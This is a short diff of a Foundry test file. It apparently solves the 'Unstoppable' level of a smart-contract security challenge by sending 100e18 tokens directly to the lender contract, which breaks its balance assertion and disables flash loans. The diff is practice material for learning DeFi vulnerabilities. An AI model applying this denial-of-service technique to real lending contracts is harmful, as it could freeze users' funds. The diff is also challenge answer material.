@@ -59,16 +59,19 @@ contract Unstoppable is Test {
     function testExploit() public {
         /**
          * EXPLOIT START *
+         
          */
         /**
          * EXPLOIT END *
          */
+        dvt.transfer(address(unstoppableLender), 100e18);
+        
         vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
-        validation();
+        _validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
 
-    function validation() internal {
+    function _validation() internal {
         // It is no longer possible to execute flash loans
         vm.startPrank(someUser);
         receiverUnstoppable.executeFlashLoan(10);
